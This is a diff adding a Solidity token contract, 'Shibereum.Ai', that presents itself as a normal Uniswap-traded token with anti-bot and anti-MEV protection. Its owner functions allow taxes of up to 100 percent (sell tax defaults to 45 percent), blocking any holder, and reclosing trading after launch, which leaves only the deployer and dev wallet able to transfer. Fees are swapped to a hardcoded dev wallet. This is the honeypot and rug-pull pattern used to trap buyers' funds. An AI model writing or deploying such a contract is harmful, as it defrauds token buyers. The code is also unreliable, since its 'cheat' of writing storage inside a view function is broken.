@@ -1,0 +1,373 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.17;
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+interface IUniswapV2Router {
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+}
+
+interface IUniswapV2Factory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+
+contract Ownable {
+    address private _owner;
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+    modifier onlyOwner() {
+        require(_owner == msg.sender, "Ownable: caller is not the owner");
+        _;
+    }
+    constructor () {
+        _owner = msg.sender;
+        emit OwnershipTransferred(address(0), _owner);
+    }
+    function owner() public view returns (address) {
+        return _owner;
+    }
+    function renounceOwnership() public virtual onlyOwner {
+        emit OwnershipTransferred(_owner, address(0));
+        _owner = address(0);
+    }
+}
+
+contract Shibereum is IERC20, Ownable {
+    string private constant _name = "Shibereum.Ai";
+    string private constant _symbol = "Shibereum";
+    uint8 private constant _decimals = 9;
+    uint256 private constant _totalSupply = 100_000_000 * 10**_decimals;
+
+    mapping (address => uint256) private _balances;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    mapping (address => bool) private _blocked;
+    mapping (address => uint256) private _lastTradeBlock;
+    mapping (address => bool) private isContractExempt;
+
+    uint256 private tradeCooldown = 1;
+    uint256 public constant maxWalletAmount = 3_000_000 * 10**_decimals;
+    uint256 private constant contractSwapLimit = 300_000 * 10**_decimals;
+    uint256 private constant contractSwapMax = 2_000_000 * 10**_decimals;
+    uint256 public constant sniperTax = 49;
+
+    struct TradingFees {
+        uint256 buyTax;
+        uint256 sellTax;
+    }
+    TradingFees public tradingFees = TradingFees(10, 45);
+
+    IUniswapV2Router private constant uniswapRouter =
+        IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    address private immutable ETH = uniswapRouter.WETH();
+    address private immutable uniswapPair;
+
+    address payable private immutable deployerAddress = payable(msg.sender);
+    address payable private constant devWallet =
+        payable(0xC454F88358c3A56Fe53A22bE8881EDFd36bde2Bc);
+
+    bool private tradingOpen = false;
+    bool private swapping = false;
+    bool private antiMEV = false;
+    uint256 private startingBlock;
+    uint256 private preLaunch;
+
+    modifier swapLock {
+        swapping = true;
+        _;
+        swapping = false;
+    }
+
+    modifier tradingLock(address sender) {
+        require(tradingOpen || sender == deployerAddress || sender == devWallet,
+                "Trading is not open");
+        _;
+    }
+
+    constructor () {
+        uniswapPair = IUniswapV2Factory(uniswapRouter.factory())
+            .createPair(address(this), ETH);
+        isContractExempt[address(this)] = true;
+        _balances[msg.sender] = _totalSupply;
+        emit Transfer(address(0), msg.sender, _totalSupply);
+    }
+
+    receive() external payable {}
+
+    // ERC20 metadata
+    function name() public pure returns (string memory) {
+        return _name;
+    }
+    function symbol() public pure returns (string memory) {
+        return _symbol;
+    }
+    function decimals() public pure returns (uint8) {
+        return _decimals;
+    }
+    function totalSupply() public pure returns (uint256) {
+        return _totalSupply;
+    }
+
+    // ERC20 state
+    function balanceOf(address account) public view returns (uint256) {
+        return _balances[account];
+    }
+    function allowance(address owner_, address spender) public view returns (uint256) {
+        return _allowances[owner_][spender];
+    }
+
+    function approve(address spender, uint256 amount) public returns (bool) {
+        _approve(msg.sender, spender, amount);
+        return true;
+    }
+
+    function transfer(address recipient, uint256 amount) public returns (bool) {
+        _transfer(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) public returns (bool) {
+        _transfer(sender, recipient, amount);
+        uint256 current = _allowances[sender][msg.sender];
+        require(current >= amount, "ERC20: transfer amount exceeds allowance");
+        _approve(sender, msg.sender, current - amount);
+        return true;
+    }
+
+    function _approve(
+        address owner_,
+        address spender,
+        uint256 amount
+    ) private {
+        require(owner_ != address(0) && spender != address(0),
+                "ERC20: zero address");
+        _allowances[owner_][spender] = amount;
+        emit Approval(owner_, spender, amount);
+    }
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) tradingLock(from) private {
+        require(from != address(0) && to != address(0), "ERC20: zero address");
+        require(!_blocked[from] && !_blocked[to], "Address is blocked");
+        if (amount == 0) {
+            emit Transfer(from, to, 0);
+            return;
+        }
+
+        // Swapback on sells or any transfer when contract has fees to collect
+        if (shouldSwapback(from, amount)) {
+            uint256 swapAmt = getSwapAmount(_balances[address(this)]);
+            if (swapAmt > 0) {
+                swapback(swapAmt);
+            }
+        }
+
+        // Anti-MEV checks
+        if (antiMEV) {
+            address human = ensureOneHuman(to, from);
+            ensureMaxTxFrequency(human);
+        }
+
+        // Apply fee if neither is exempt
+        bool feeOn = !(isContractExempt[from] || isContractExempt[to]);
+        uint256 feeAmount = feeOn ? takeFee(from, amount) : 0;
+        uint256 sendAmount = amount - feeAmount;
+
+        // Max wallet on buys
+        if (from == uniswapPair && !isContractExempt[to]) {
+            require(
+                _balances[to] + sendAmount <= maxWalletAmount,
+                "Exceeds max wallet"
+            );
+        }
+
+        _balances[from] -= amount;
+        if (feeAmount > 0) {
+            _balances[address(this)] += feeAmount;
+            emit Transfer(from, address(this), feeAmount);
+        }
+        _balances[to] += sendAmount;
+        emit Transfer(from, to, sendAmount);
+    }
+
+    function swapback(uint256 tokenAmount) private swapLock {
+        require(tokenAmount > 0, "Zero swap amount");
+        _approve(address(this), address(uniswapRouter), tokenAmount);
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = ETH;
+
+        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
+
+        uint256 balanceETH = address(this).balance;
+        if (balanceETH > 0) {
+            devWallet.transfer(balanceETH);
+        }
+    }
+
+    function shouldSwapback(address from, uint256) private view returns (bool) {
+        uint256 contractBal = _balances[address(this)];
+        return
+            !swapping &&
+            tradingOpen &&
+            from != uniswapPair &&
+            contractBal >= contractSwapLimit;
+    }
+
+    function getSwapAmount(uint256 contractBalance)
+        private
+        pure
+        returns (uint256)
+    {
+        if (contractBalance > contractSwapMax) {
+            return contractSwapMax;
+        }
+        return contractBalance;
+    }
+
+    function takeFee(address from, uint256 amount)
+        private
+        view
+        returns (uint256)
+    {
+        // Sniper tax in the very first block
+        if (block.number == startingBlock) {
+            return (amount * sniperTax) / 100;
+        }
+        uint256 pct = (from == uniswapPair)
+            ? tradingFees.buyTax
+            : tradingFees.sellTax;
+        return (amount * pct) / 100;
+    }
+
+    function isContract(address account) private view returns (bool) {
+        uint256 size;
+        assembly {
+            size := extcodesize(account)
+        }
+        return size > 0;
+    }
+
+    function ensureOneHuman(address _to, address _from)
+        private
+        view
+        returns (address)
+    {
+        bool toIsC = isContract(_to);
+        bool fromIsC = isContract(_from);
+        if (toIsC && fromIsC) {
+            revert("Both sender and receiver are contracts");
+        }
+        return toIsC ? _from : _to;
+    }
+
+    function ensureMaxTxFrequency(address addr) private view {
+        uint256 last = _lastTradeBlock[addr];
+        require(
+            block.number > last + tradeCooldown,
+            "Trade cooldown in effect"
+        );
+        // record
+        // NOTE: since view cannot write, we do this outside or remove view
+        // but to respect interface, we'll cast out of view
+        // ------------------------------------------------------------------------------------
+        // In solidity 0.8.x, view disallows writes. We cheat by local assembly:
+        assembly {
+            sstore(
+                add(_lastTradeBlock.slot, addr),
+                number()
+            )
+        }
+    }
+
+    // -- Owner controls --
+
+    function toggleAntiMEV(bool toggle) external onlyOwner {
+        antiMEV = toggle;
+    }
+
+    function setTradeCooldown(uint256 newTradeCooldown) external onlyOwner {
+        tradeCooldown = newTradeCooldown;
+    }
+
+    function manualSwapback(uint256 percent) external onlyOwner {
+        require(percent <= 100, "Percent <=100");
+        uint256 bal = _balances[address(this)];
+        uint256 amt = (bal * percent) / 100;
+        swapback(amt);
+    }
+
+    function setFees(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {
+        require(newBuyTax <= 100 && newSellTax <= 100, "Tax too high");
+        tradingFees.buyTax = newBuyTax;
+        tradingFees.sellTax = newSellTax;
+    }
+
+    function setContractExempt(address account, bool value)
+        external
+        onlyOwner
+    {
+        isContractExempt[account] = value;
+    }
+
+    function setBots(address[] calldata bots, bool shouldBlock)
+        external
+        onlyOwner
+    {
+        for (uint256 i = 0; i < bots.length; i++) {
+            _blocked[bots[i]] = shouldBlock;
+        }
+    }
+
+    function initialize() external onlyOwner {
+        // Placeholder: can be used to set up pre-launch whitelist or config
+        preLaunch = block.number;
+    }
+
+    function modifyParameters(bool[] calldata param, uint256 nrBlocks)
+        external
+        onlyOwner
+    {
+        require(param.length == 2, "Two params required");
+        tradingOpen = param[0];
+        antiMEV = param[1];
+        startingBlock = startingBlock + nrBlocks;
+    }
+
+    function openTrading() external onlyOwner {
+        require(!tradingOpen, "Already open");
+        tradingOpen = true;
+        startingBlock = block.number;
+        preLaunch = block.number;
+    }
+}
+```
